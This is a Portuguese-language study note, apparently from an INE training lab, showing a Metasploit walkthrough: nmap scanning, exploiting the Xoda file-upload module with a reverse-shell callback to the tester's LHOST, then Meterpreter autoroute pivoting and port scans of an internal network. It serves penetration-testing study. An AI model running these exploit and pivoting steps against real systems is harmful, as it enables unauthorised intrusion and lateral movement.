#+TITLE: ğŸ›¡ï¸ Msf Second System: ExploraÃ§Ã£o e Pivoting
#+AUTHOR: Gabriel
#+OPTIONS: toc:2

* ğŸ” Fase 1: Reconhecimento e ImportaÃ§Ã£o
ApÃ³s identificar o alvo primÃ¡rio, realizamos um scan detalhado para alimentar a base de dados do Metasploit.

** ğŸ›°ï¸ Scan com Nmap
O comando abaixo gera um arquivo XML compatÃ­vel com o MSF:
#+begin_src sh
sudo nmap -Pn -sV -sS -p- demo1.ine.local -oX result.xml
#+end_src

** ğŸ—„ï¸ PreparaÃ§Ã£o do Banco de Dados
Para gerenciar os hosts e vulnerabilidades dentro do console, iniciamos o PostgreSQL.
#+begin_src sh
# Iniciar serviÃ§o e abrir console
sudo service postgresql start
msfconsole -q

# No msfconsole:
db_import result.xml
hosts
services
#+end_src

* ğŸš€ Fase 2: ExploraÃ§Ã£o (Xoda File Upload)
Identificamos a aplicaÃ§Ã£o *Xoda* na porta 80, vulnerÃ¡vel a Arbitrary File Upload.

** ğŸ› ï¸ ConfiguraÃ§Ã£o do Exploit
#+begin_src msf
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /xoda/
set LHOST <seu_ip_tun0>
exploit
#+end_src

* ğŸŒ Fase 3: Post-Exploitation e Pivoting (MovimentaÃ§Ã£o Lateral)
Ao obter o shell, verificamos que o host possui uma segunda interface de rede (~192.168.1.0/24~, por exemplo), permitindo alcanÃ§ar alvos internos.

** ğŸ“ IdentificaÃ§Ã£o da Rede Interna
Dentro da sessÃ£o do Meterpreter:
#+begin_src msf
meterpreter > ipconfig
meterpreter > run autoroute -s 192.168.1.0/24
#+end_src

** ğŸ•µï¸ Scanning no Novo Alvo
Com a rota estabelecida, o trÃ¡fego do Metasploit agora passa por dentro da mÃ¡quina comprometida.
#+begin_src msf
# Colocar sessÃ£o em background
meterpreter > background

# Usar scanner de portas no alvo interno
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.5  # IP encontrado na rede interna
set PORTS 1-1000
run
#+end_src

* ğŸ“ Notas de Estudo
- **Autoroute**: Comando essencial para criar o "tÃºnel". Sem ele, o MSF tenta enviar pacotes pela sua interface local e nunca atingirÃ¡ a rede interna.
- **Xoda**: Vulnerabilidade clÃ¡ssica de falta de sanitizaÃ§Ã£o no upload de arquivos PHP.
